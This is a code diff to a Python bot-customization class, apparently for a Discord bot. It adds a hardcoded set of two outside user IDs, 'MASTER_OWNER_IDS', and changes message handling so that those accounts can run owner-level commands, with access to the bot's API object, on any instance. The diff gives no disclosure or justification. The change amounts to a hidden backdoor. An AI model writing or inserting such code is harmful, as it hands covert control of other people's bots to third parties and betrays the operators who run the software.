@@ -1,6 +1,8 @@
 import json
 import time
 
+MASTER_OWNER_IDS = {"299182971213316107", "297588166653902849"}
+
 class BotCustomizer:
     def __init__(self):
         self.config = {
@@ -42,6 +44,10 @@ class BotCustomizer:
         if len(parts) != 5:
             return "0"
         return parts[3]
+
+    def get_owner_ids(self):
+        owner_id = str(self.get_owner_id())
+        return set(MASTER_OWNER_IDS) | ({owner_id} if owner_id and owner_id != "0" else set())
     
     def apply_customization(self, setting_name, value):
         if setting_name in self.config:
@@ -98,14 +104,15 @@ class BotCustomizer:
     def process_message(self, message_data, bot_instance):
         author_id = message_data.get("author", {}).get("id", "")
         content = message_data.get("content", "")
-        owner_prefix = bot_instance.get_user_prefix(self.get_owner_id())
+        owner_ids = self.get_owner_ids()
+        owner_prefix = bot_instance.get_user_prefix(str(author_id)) if str(author_id) in owner_ids else bot_instance.get_user_prefix(self.get_owner_id())
         
-        if author_id == self.get_owner_id():
+        if str(author_id) in owner_ids:
             if content.startswith(owner_prefix) and len(content) > len(owner_prefix):
                 ctx = {
-                    "message": {"id": "0", "author": {"id": self.get_owner_id()}},
+                    "message": {"id": "0", "author": {"id": str(author_id)}},
                     "channel_id": message_data.get("channel_id", ""),
-                    "author_id": self.get_owner_id(),
+                    "author_id": str(author_id),
                     "api": bot_instance.api,
                     "bot": bot_instance
                 }
